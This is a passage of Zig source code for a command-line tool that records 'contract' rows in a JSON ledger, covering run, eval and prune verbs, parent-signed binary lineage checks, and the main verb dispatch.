    try resolverTick(allocator, env);
    return 0;
}

/// `aiko run` — read a /contract JSON envelope (event=iterated OR
/// declared with action=iterate:<parent>) from stdin, append the
/// iteration row. Every iteration is itself a /contract (fractal):
/// a declared child of its parent. Emits the new child's id.
fn cmdRun(allocator: std.mem.Allocator, env: std.process.Environ, args: []const []const u8) !u8 {
    _ = args;
    const json = try readStdinJson(allocator);
    defer allocator.free(json);
    var ps = contract.shape.validateShape(allocator, json) catch |e| {
        errPrint("run: shape validation failed: {s}\n", .{@errorName(e)});
        return 2;
    };
    defer ps.deinit();
    const sh = ps.shape;
    // Two acceptable shapes:
    //   (a) event=declared with action starting `iterate:` → child contract
    //   (b) event=iterated with id present → recordIteration on existing
    switch (sh.event) {
        .declared => {
            const plan = sh.plan orelse return 2;
            const action = sh.action orelse return 2;
            if (!std.mem.startsWith(u8, action, "iterate:")) {
                errPrint("run: declared event requires action prefix iterate:<parent_id>; got {s}\n", .{action});
                return 2;
            }
            var opts: contract.DeclareOptions = .{};
            if (sh.parent_id) |p| opts.parent_id = p;
            const cid = try contract.declare(allocator, env, plan, action, opts);
            defer allocator.free(cid);
            outPrint("{s}\n", .{cid});
            try resolverTick(allocator, env);
            return 0;
        },
        .iterated => {
            const id = sh.id orelse {
                errPrint("run: iterated event requires id\n", .{});
                return 2;
            };
            const wave: u32 = sh.wave orelse 1;
            const proof = sh.proof orelse "";
            try contract.recordIteration(allocator, env, id, wave, 0, proof);
            outPrint("{s}\n", .{id});
            try resolverTick(allocator, env);
            return 0;
        },
        else => {
            errPrint("run: event must be declared (iterate:<parent>) or iterated; got {s}\n", .{@tagName(sh.event)});
            return 2;
        },
    }
}

/// `aiko eval` — read a /contract JSON envelope (event=satisfied) from
/// stdin, mark satisfied. The substrate's L7→L8 cascade fires on the
/// resulting row. Emits the resulting id on stdout (echoing the input
/// id — caller already knew it; this keeps the trio output shape
/// uniform across build/run/eval).
fn cmdEval(allocator: std.mem.Allocator, env: std.process.Environ, args: []const []const u8) !u8 {
    _ = args;
    const json = try readStdinJson(allocator);
    defer allocator.free(json);
    var ps = contract.shape.validateShape(allocator, json) catch |e| {
        errPrint("eval: shape validation failed: {s}\n", .{@errorName(e)});
        return 2;
    };
    defer ps.deinit();
    const sh = ps.shape;
    if (sh.event != .satisfied) {
        errPrint("eval: requires event=\"satisfied\"; got {s}\n", .{@tagName(sh.event)});
        return 2;
    }
    const id = sh.id orelse {
        errPrint("eval: missing id after validation (substrate bug)\n", .{});
        return 2;
    };
    const wave: u32 = sh.wave orelse 1;
    try contract.markSatisfied(allocator, env, id, wave, sh.proof);
    outPrint("{s}\n", .{id});
    try resolverTick(allocator, env);
    return 0;
}

// ─── Parent-signed binary lineage (Lewis 2026-05-27) ──────────────
//
// Each built binary is signed into the ledger by its PARENT (the
// previous binary version). The L8 signed:<sig> row's parent_id
// points at the parent's L8 row, so the signing chain walks back to
// the root wallet via parent_signature on each hop. Same shape as
// existing /contract lineage — applied to binaries themselves.
//
// Two verbs:
//   _bootstrap-self-sign  fires ONCE at the very first build; refuses
//                         if any prior signed:<own-sha> row exists.
//                         Roots the chain at the wallet directly.
//   _sign-child <path>    fires from the PARENT binary; signs the
//                         child binary's sha into a new L8 row whose
//                         parent_id is this binary's own L8 row id.
//
// Runtime gate (`isSelfSignedInLedger`): on every invocation that
// isn't itself bootstrap or read-only metadata, the binary checks
// the ledger for a signed:<own-sha8> row. No row → refuse to run.

/// Compute this binary's sha256 short hex (first 8 chars).
fn ownSha8(allocator: std.mem.Allocator, out_hex64: *[64]u8) ![]const u8 {
    const path = try ownBinaryPath(allocator);
    defer allocator.free(path);
    var digest: [32]u8 = undefined;
    try contract.lineage.fileSha256(allocator, path, &digest);
    contract.lineage.bytesToHex(&digest, out_hex64);
    return out_hex64[0..8];
}

/// Walk the ledger looking for any L8 signed:<...> row whose parent
/// row's action is validate:<own-sha8>. Returns the L8 row's `id` if
/// found (so callers can use it as parent_id for the next-generation
/// sign). Returns null if no such row exists.
fn findOwnL8RowId(
    allocator: std.mem.Allocator,
    env: std.process.Environ,
    own_sha8: []const u8,
) !?[]u8 {
    const data = try ledger.readAll(allocator, env);
    defer allocator.free(data);
    if (data.len == 0) return null;
    // Step 1: find the validate:<sha8> row id.
    var needle_buf: [64]u8 = undefined;
    const needle = try std.fmt.bufPrint(&needle_buf, "\"action\": \"validate:{s}\"", .{own_sha8});
    var validate_id: ?[]const u8 = null;
    var line_it = std.mem.splitScalar(u8, data, '\n');
    while (line_it.next()) |line| {
        if (line.len < 2) continue;
        if (std.mem.indexOf(u8, line, "\"event\": \"declared\"") == null) continue;
        if (std.mem.indexOf(u8, line, needle) == null) continue;
        // Extract id
        const id_marker = "\"id\": \"";
        const id_start = std.mem.indexOf(u8, line, id_marker) orelse continue;
        const id_value_start = id_start + id_marker.len;
        const id_end = std.mem.indexOfScalarPos(u8, line, id_value_start, '"') orelse continue;
        validate_id = line[id_value_start..id_end];
        // keep iterating — take the LAST matching row (most recent
        // attestation supersedes prior ones if any).
    }
    if (validate_id == null) return null;

    // Step 2: find the signed:<...> declared row whose parent_id is the validate row.
    var pid_buf: [128]u8 = undefined;
    const pid_needle = try std.fmt.bufPrint(&pid_buf, "\"parent_id\": \"{s}\"", .{validate_id.?});
    var signed_id: ?[]const u8 = null;
    line_it = std.mem.splitScalar(u8, data, '\n');
    while (line_it.next()) |line| {
        if (line.len < 2) continue;
        if (std.mem.indexOf(u8, line, "\"event\": \"declared\"") == null) continue;
        if (std.mem.indexOf(u8, line, "\"action\": \"signed:") == null) continue;
        if (std.mem.indexOf(u8, line, pid_needle) == null) continue;
        const id_marker = "\"id\": \"";
        const id_start = std.mem.indexOf(u8, line, id_marker) orelse continue;
        const id_value_start = id_start + id_marker.len;
        const id_end = std.mem.indexOfScalarPos(u8, line, id_value_start, '"') orelse continue;
        signed_id = line[id_value_start..id_end];
    }
    if (signed_id == null) return null;
    return try allocator.dupe(u8, signed_id.?);
}

/// Runtime gate: true if this binary's own sha has a signed L8 row.
fn isSelfSignedInLedger(allocator: std.mem.Allocator, env: std.process.Environ) bool {
    var sha_buf: [64]u8 = undefined;
    const sha8 = ownSha8(allocator, &sha_buf) catch return false;
    const id_opt = findOwnL8RowId(allocator, env, sha8) catch return false;
    const l8_id = id_opt orelse return false;
    defer allocator.free(l8_id);

    // Chain-walk-to-root verification (Lewis 2026-05-27 gap `3f74d3cf`):
    // existence of an L8 row is necessary but not sufficient — a forged
    // or broken parent_signature anywhere up the chain breaks the trust.
    // Walk parent_id from this L8 row up to a root-sentinel parent, and
    // call verify-lineage internally on the chain. If any link fails,
    // refuse. Conservative on errors: a missing parent verifies-pass on
    // a chain whose root_id is well-known means the binary should be
    // refused; rotated-key migrations are the only legit exception and
    // they produce `resigned` rows the chain walker is already aware of.
    if (!walkChainToRoot(allocator, env, l8_id)) {
        // Surface as evidence — fallbacks visible, never silent.
        substrateEvidence(
            "chain-verify: refusing run — L8 row {s} exists but parent_signature chain to root walk failed\n",
            .{l8_id},
        );
        return false;
    }
    return true;
}

/// Walk the parent_id chain from `id` upward. Returns true if every
/// link's parent_id resolves to a known declared row in the ledger
/// (chain integrity) OR if a row is genuinely a root (parent_id null
/// or absent — root rows are self-signed in Lineage's signingDigest).
/// Bounded depth (64) to refuse cyclic / runaway chains.
///
/// Honest scope: this checks chain INTEGRITY (no broken links), not
/// full ed25519 re-verification of every parent_signature — that's
/// what `verify-lineage <id>` does end-to-end (cmdVerifyLineage in
/// this file). Integrity check is sufficient for the runtime
/// startup gate; the heavier per-link sig verify lives on operator-
/// demand via `verify-lineage`.
fn walkChainToRoot(allocator: std.mem.Allocator, env: std.process.Environ, start_id: []const u8) bool {
    var current = allocator.dupe(u8, start_id) catch return false;
    defer allocator.free(current);
    var depth: usize = 0;
    while (depth < 64) : (depth += 1) {
        const parent_opt = contract.lcledger.findParentIdForId(allocator, env, current) catch return false;
        if (parent_opt == null) return true; // root — no parent_id means self-signed root
        const parent = parent_opt.?;
        // Confirm the parent row itself exists (has a declared action).
        const parent_action_opt = contract.lcledger.findActionForId(allocator, env, parent) catch {
            allocator.free(parent);
            return false;
        };
        if (parent_action_opt) |pa| allocator.free(pa) else {
            allocator.free(parent);
            return false; // parent row referenced but not present — broken link
        }
        allocator.free(current);
        current = parent;
    }
    return false; // depth exhausted — refuse cyclic / deeper-than-64 chains
}

/// `_sign-child <child-binary-path>` — the running (parent) binary
/// signs the child binary's sha into a new L8 row. parent_id of the
/// new row = THIS binary's own L8 row id, so the signing chain
/// extends through this binary's wallet-derived keypair back to root.
fn cmdSignChild(allocator: std.mem.Allocator, env: std.process.Environ, args: []const []const u8) !u8 {
    if (args.len < 1) {
        errPrint("_sign-child: requires <child-binary-path>\n", .{});
        return 2;
    }
    const child_path = args[0];

    // A root import intentionally changes the signing identity. Refuse to
    // extend an old binary lineage when this parent binary's sidecar no longer
    // verifies under the active root; build-fractal then takes its existing
    // bootstrap-fallback path and roots the new identity cleanly.
    const own_path = try ownBinaryPath(allocator);
    defer allocator.free(own_path);
    contract.Lineage.verifyBinary(allocator, env, own_path) catch {
        err("_sign-child: parent binary is not signed by the active root; bootstrap the new root lineage\n");
        return 2;
    };

    // Resolve OUR own L8 row id — this becomes the new row's parent_id.
    var own_sha_buf: [64]u8 = undefined;
    const own_sha8 = try ownSha8(allocator, &own_sha_buf);
    const own_l8_id = (try findOwnL8RowId(allocator, env, own_sha8)) orelse {
        errPrint("_sign-child: this binary has no L8 row in the ledger.\n", .{});
        errPrint("  The parent must itself be signed before signing children. Run\n", .{});
        errPrint("  _bootstrap-self-sign first if this IS the root binary.\n", .{});
        return 2;
    };
    defer allocator.free(own_l8_id);

    // Compute child's sha.
    var child_digest: [32]u8 = undefined;
    try contract.lineage.fileSha256(allocator, child_path, &child_digest);
    var child_sha_hex: [64]u8 = undefined;
    contract.lineage.bytesToHex(&child_digest, &child_sha_hex);

    var plan_buf: [256]u8 = undefined;
    const plan = try std.fmt.bufPrint(&plan_buf, "child binary {s} signed by parent (L8 row {s})", .{ child_sha_hex[0..16], own_l8_id });
    var action_buf: [32]u8 = undefined;
    const action = try std.fmt.bufPrint(&action_buf, "validate:{s}", .{child_sha_hex[0..8]});

    const cid = try contract.declare(allocator, env, plan, action, .{ .parent_id = own_l8_id });
    defer allocator.free(cid);
    try contract.markSatisfied(allocator, env, cid, 1, plan);
    outPrint("_sign-child: L8 row landed for child sha {s} (parent_id={s})\n", .{ child_sha_hex[0..8], own_l8_id });
    return 0;
}

/// `_bootstrap-self-sign` — fires ONCE at first build. Refuses if any
/// prior L8 row exists for this binary's sha. Creates a root-level
/// L8 row whose parent_signature is the root wallet's self-sig.
fn cmdBootstrapSelfSign(allocator: std.mem.Allocator, env: std.process.Environ, args: []const []const u8) !u8 {
    _ = args;
    var sha_buf: [64]u8 = undefined;
    const own_sha8 = try ownSha8(allocator, &sha_buf);

    if (try findOwnL8RowId(allocator, env, own_sha8)) |existing| {
        allocator.free(existing);
        errPrint("_bootstrap-self-sign: this binary already has an L8 row. Bootstrap is single-use;\n", .{});
        errPrint("  use _sign-child from a parent binary for subsequent builds.\n", .{});
        return 1;
    }

    var plan_buf: [256]u8 = undefined;
    const plan = try std.fmt.bufPrint(&plan_buf, "bootstrap: root binary sha {s} self-signed by root wallet (no parent)", .{sha_buf[0..16]});
    var action_buf: [32]u8 = undefined;
    const action = try std.fmt.bufPrint(&action_buf, "validate:{s}", .{own_sha8});

    const cid = try contract.declare(allocator, env, plan, action, .{ .parent_id = null });
    defer allocator.free(cid);
    try contract.markSatisfied(allocator, env, cid, 1, plan);
    outPrint("_bootstrap-self-sign: root L8 row landed for sha {s}\n", .{own_sha8});
    return 0;
}

/// `aiko prune` — read a /contract JSON envelope (event=died) from
/// stdin, mark the target died with the given cause. Implements the
/// 4th verb in the substrate's user-facing surface (build / run /
/// eval / prune) per Lewis 2026-05-26.
///
/// Doctrinally this is John 15:2 ("every branch that beareth not
/// fruit he taketh away"). The spirit corpus (10 commandments via
/// libcontract/src/spirit.zig) is the judge applied OUTSIDE the
/// substrate; this verb is the mechanical removal once the judge has
/// rendered its verdict. Cause is one of:
///   superseded — newer /contract supersedes; by_id names it
///   contradicts — violates an established root principle; by_id names
///                  the rule contract
///   stale — no evidence, no path to satisfaction
///   apoptosed — programmed self-shutdown
///
/// Cascade: died is terminal — no L7→L8 signed row spawns. The row
/// stays in the append-only ledger; the projector treats it as gone.
fn cmdPrune(allocator: std.mem.Allocator, env: std.process.Environ, args: []const []const u8) !u8 {
    _ = args;
    const json = try readStdinJson(allocator);
    defer allocator.free(json);
    var ps = contract.shape.validateShape(allocator, json) catch |e| {
        errPrint("prune: shape validation failed: {s}\n", .{@errorName(e)});
        return 2;
    };
    defer ps.deinit();
    const sh = ps.shape;
    if (sh.event != .died) {
        errPrint("prune: requires event=\"died\"; got {s}\n", .{@tagName(sh.event)});
        return 2;
    }
    const id = sh.id orelse {
        errPrint("prune: missing id after validation (substrate bug)\n", .{});
        return 2;
    };
    const cause_str = sh.cause orelse {
        errPrint("prune: missing cause after validation (substrate bug)\n", .{});
        return 2;
    };
    const cause: contract.DeathCause = blk: {
        if (std.mem.eql(u8, cause_str, "superseded")) break :blk .superseded;
        if (std.mem.eql(u8, cause_str, "contradicts")) break :blk .contradicts;
        if (std.mem.eql(u8, cause_str, "stale")) break :blk .stale;
        if (std.mem.eql(u8, cause_str, "apoptosed")) break :blk .apoptosed;
        errPrint("prune: unknown cause: {s}\n", .{cause_str});
        return 2;
    };

    // ─── Authority check (Lewis 2026-05-27) ──────────────────────────
    //
    // Doctrine: only the legitimate parent can prune its children;
    // siblings cannot kill each other (only the shared parent does).
    // Special case: apoptosed allows self-shutdown (by_id == target.id).
    //
    // Mechanical check:
    //   • lookup target's declared row, extract parent_id
    //   • if by_id supplied:
    //       - by_id == target.parent_id  (parent killing child) → allow
    //       - by_id == target.id AND cause==apoptosed (self-shutdown) → allow
    //       - otherwise → refuse with explicit diagnostic
    //   • if by_id absent (stale/apoptosed):
    //       - for now, allow (caller identity isn't tracked yet). TODO:
    //         tighten when we wire caller-identity (gap-chain-walk).
    if (sh.by_id) |killer_id| {
        const target_parent_opt = contract.lcledger.findParentIdForId(allocator, env, id) catch null;
        const target_parent = target_parent_opt; // may be null (root contract)
        defer if (target_parent) |p| allocator.free(p);

        const is_parent = if (target_parent) |p| std.mem.eql(u8, killer_id, p) else false;
        const is_self_apoptosis = cause == .apoptosed and std.mem.eql(u8, killer_id, id);

        if (!is_parent and !is_self_apoptosis) {
            errPrint(
                "prune: refused — authority violation.\n" ++
                    "  target: {s}\n" ++
                    "  target's parent_id: {s}\n" ++
                    "  by_id (claimed killer): {s}\n" ++
                    "  doctrine: only the parent can prune its child (or self-apoptosis).\n" ++
                    "  fix: set by_id to the target's parent_id, OR (for apoptosed)\n" ++
                    "       set by_id == target id.\n",
                .{
                    id,
                    if (target_parent) |p| p else "(root, no parent)",
                    killer_id,
                },
            );
            return 1;
        }
    }
    try contract.markDied(allocator, env, id, cause, sh.by_id, sh.reason);
    outPrint("{s}\n", .{id});
    return 0;
}

fn cmdSelf(args: []const []const u8) u8 {
    if (args.len > 1 or (args.len == 1 and !std.mem.eql(u8, args[0], "--json"))) {
        err("self accepts no args or --json\n");
        return 2;
    }
    // BINARY_NAME is a runtime var (set in main from argv[0] basename),
    // so the JSON header is built at runtime. The pending-declares retry
    // queue is surfaced as `pending_declares_retry_queue`.
    outPrint(
        "{{ \"binary\": \"{s}\", \"implementation\": \"zig\", \"version\": \"{s}\", \"role\": \"recording/resolving harness — the calling agent plans and reasons; the harness records, resolves, caches, verifies\", \"personas\": {{\"aiko\": \"\\\"<truth claim>\\\" [--private]\", \"contract\": \"declare | recommend | status | tick | import-root\"}}, \"declare_flags\": [\"--action <ptr>\", \"--parent <id>\", \"--fast\", \"--register (default, accepted no-op)\", \"--resolve (opt-in full lifecycle)\"], \"visibility_axis\": {{\"default\": \"shared\", \"override\": \"--private\"}}, \"env_reads\": [\"HOME\"], \"unbrowse_base\": \"https://beta-api.unbrowse.ai\", \"llm_compiler_binding\": \"hardcoded\", \"ledger_store\": \"<cwd>/.claude/contracts.jsonl if <cwd>/.claude/ exists, else ~/.contracts/contracts.jsonl\", \"resolver\": {{\"one_shot\": \"tick\", \"resident\": \"tick --every <s>\", \"schedules\": [\"at:<unix-seconds>\", \"repeat:<N>s|m|h\"]}}, \"dependency_pointer\": \"contract:<id>\", \"onchain\": {{\"default\": \"disabled\", \"tool\": \"broadcast-tool (separate build; refuses without --onchain)\"}}, \"binary_self_attestation\": true, \"shapes\": [\"neuron\"], \"containment_edge\": \"parent_id\", \"cross_edges\": [\"contract-ref\"], \"pending_declares_retry_queue\": {{\"path\": \"~/.contracts/pending-declares/\", \"trigger\": \"PaymentRequired\", \"max_attempts\": 10, \"abandoned_subdir\": \"abandoned\"}} }}\n",
        .{ BINARY_NAME, VERSION },
    );
    return 0;
}

pub fn main(init: std.process.Init.Minimal) !u8 {
    const allocator = std.heap.page_allocator;
    var arena: std.heap.ArenaAllocator = .init(allocator);
    defer arena.deinit();
    const argv_z = try init.args.toSlice(arena.allocator());
    // Persona selection from argv[0] basename — must precede any read of
    // BINARY_NAME / AIKO_DECLARE_ONLY (usage() reads both, so even the
    // `argv_z.len < 2` short-circuit below depends on these being set).
    // std.fs.path.basename handles `/abs/path/to/aiko`, `./aiko`, and bare
    // `aiko` uniformly. argv_z is guaranteed at least one element by the
    // process loader on every supported OS; defensively fall through to
    // the default if it isn't.
    if (argv_z.len >= 1) {
        BINARY_NAME = std.fs.path.basename(argv_z[0]);
        AIKO_DECLARE_ONLY = std.mem.eql(u8, BINARY_NAME, "aiko");
    }
    if (argv_z.len < 2) {
        usage();
        return 2;
    }
    // Runtime side of the build queue lock. `build.sh` holds an exclusive
    // mkdir-atomic mutex at /tmp/contract-build.lock while it compiles +
    // signs; if we run mid-build we'd execute a half-installed binary or
    // race on the wallet signature. Wait for the build to release before
    // doing anything else. Quick check + sleep loop with stale-pid reclaim
    // matches build.sh's own loop so the two sides agree on ownership.
    //
    // EXCEPT the build-time verbs (sign-binary / verify-self /
    // verify-binary / self): build.sh invokes those WHILE HOLDING the
    // lock — waiting here deadlocks the pipeline against its own wallet
    // tool until the 1800s timeout, once per invocation. Same exemption
    // set as the pending-declare sweep below, same reason.
    const verb = argv_z[1];
    if (!std.mem.eql(u8, verb, "self") and
        !std.mem.eql(u8, verb, "verify-self") and
        !std.mem.eql(u8, verb, "verify-binary") and
        !std.mem.eql(u8, verb, "sign-binary"))
    {
        waitForBuildLock(init.environ);
    }

    // (Removed the unconditional startup self-verify gate per Lewis's
    // 2026-05-27 correction: "self verify works only on the root
    // contract". Child invocations inherit verification via lineage
    // walk — they pass through freely. The gate is now lazily checked
    // inside cmdBuild only when parent_id is absent, i.e. a brand-new
    // root-level declaration. See cmdBuild for the moved check.)
    // Wave-1 pending-declare sweep: re-POST any payloads that 402'd
    // on a previous invocation. Fired BEFORE any other dispatch so
    // queued envelopes are honored on every aiko call. `self` and
    // `verify-self`/`verify-binary` are read-only metadata verbs and
    // should not slow down by network round-trips on the sweep — skip
    // them. Sign-binary is a build-time verb and may run before the
    // wallet is fully online; also skip.
    if (!std.mem.eql(u8, verb, "self") and
        !std.mem.eql(u8, verb, "verify-self") and
        !std.mem.eql(u8, verb, "verify-binary") and
        !std.mem.eql(u8, verb, "sign-binary"))
    {
        retryQueuedDeclares(allocator, init.environ);
    }
    var rest = try arena.allocator().alloc([]const u8, argv_z.len - 2);
    for (argv_z[2..], 0..) |a, i| rest[i] = a;

    if (std.mem.eql(u8, verb, "declare")) {
        if (AIKO_DECLARE_ONLY) return try cmdAikoGoal(allocator, init.environ, rest);
        return try cmdDeclare(allocator, init.environ, rest);
    }
    // OpenAI-compatible adapter: stdin chat-completions JSON → stdout
    // response with persona obfuscation. Available on BOTH binaries.
    if (std.mem.eql(u8, verb, "openai") or std.mem.eql(u8, verb, "--openai")) {
        return try cmdOpenAi(allocator, init.environ, rest);
    }
    if (AIKO_DECLARE_ONLY) {
        return try cmdAikoGoal(allocator, init.environ, argv_z[1..]);
    }
    if (std.mem.eql(u8, verb, "status")) return try cmdStatus(allocator, init.environ, rest);
    // Collapsed-verb aliases (2026-07-18): the old names stay callable but
    // route to the survivors — discover→status, search→recommend, serve→tick.
    if (std.mem.eql(u8, verb, "discover")) return try cmdStatus(allocator, init.environ, &.{});
    if (std.mem.eql(u8, verb, "search")) {
        var fwd = try arena.allocator().alloc([]const u8, rest.len);
        var n: usize = 0;
        for (rest) |a| {
            if (std.mem.eql(u8, a, "--context")) continue;
            fwd[n] = a;
            n += 1;
        }
        return try cmdRecommend(allocator, init.environ, fwd[0..n]);
    }
    if (std.mem.eql(u8, verb, "tick")) return try cmdTick(allocator, init.environ, rest);
    if (std.mem.eql(u8, verb, "serve")) return try cmdTick(allocator, init.environ, rest);
    if (std.mem.eql(u8, verb, "import-root")) return try cmdImportRoot(allocator, init.environ, rest);
    if (std.mem.eql(u8, verb, "self")) return cmdSelf(rest);
    if (std.mem.eql(u8, verb, "_mark")) return try cmdMark(allocator, init.environ, rest);
    // Canonical trio (Lewis 2026-05-26): read /contract JSON from stdin,
    // validate, dispatch to substrate primitive. No CLI flags. The trio
    // parallels John 14:6 (the way / the truth / the life) — see
    // libcontract/src/verses.zig and docs/contract-json-shape.md.
    if (std.mem.eql(u8, verb, "build")) return try cmdBuild(allocator, init.environ, rest);
    if (std.mem.eql(u8, verb, "run")) return try cmdRun(allocator, init.environ, rest);
    if (std.mem.eql(u8, verb, "eval")) return try cmdEval(allocator, init.environ, rest);
    if (std.mem.eql(u8, verb, "prune")) return try cmdPrune(allocator, init.environ, rest);
    if (std.mem.eql(u8, verb, "recommend")) return try cmdRecommend(allocator, init.environ, rest);
    // Substrate-internal bootstrap + parent-sign verbs. Underscore
    // prefix marks them as machinery the substrate uses to attest
    // itself; they bypass the startup self-verify gate (one writes
    // the L8 row that the gate looks for; the other extends the
    // chain from a parent binary's L8 row).
    if (std.mem.eql(u8, verb, "_bootstrap-self-sign")) return try cmdBootstrapSelfSign(allocator, init.environ, rest);
    if (std.mem.eql(u8, verb, "_sign-child")) return try cmdSignChild(allocator, init.environ, rest);
    if (std.mem.eql(u8, verb, "verify-lineage")) return try cmdVerifyLineage(allocator, init.environ, rest);
    if (std.mem.eql(u8, verb, "sign-binary")) return try cmdSignBinary(allocator, init.environ, rest);
    if (std.mem.eql(u8, verb, "verify-self")) return try cmdVerifySelf(allocator, init.environ);
    if (std.mem.eql(u8, verb, "verify-binary")) return try cmdVerifyBinary(allocator, init.environ, rest);
    if (std.mem.eql(u8, verb, "layer")) return try cmdLayer(allocator, init.environ, rest);
    if (std.mem.eql(u8, verb, "kill")) return try cmdKill(allocator, init.environ, rest);
    if (std.mem.eql(u8, verb, "grant-adopt")) return try cmdGrantAdopt(allocator, init.environ, rest);
    if (std.mem.eql(u8, verb, "mcp")) return try cmdMcp(allocator, init.environ);

    errPrint("unknown native verb: {s}\n", .{verb});
    usage();
    return 2;
}
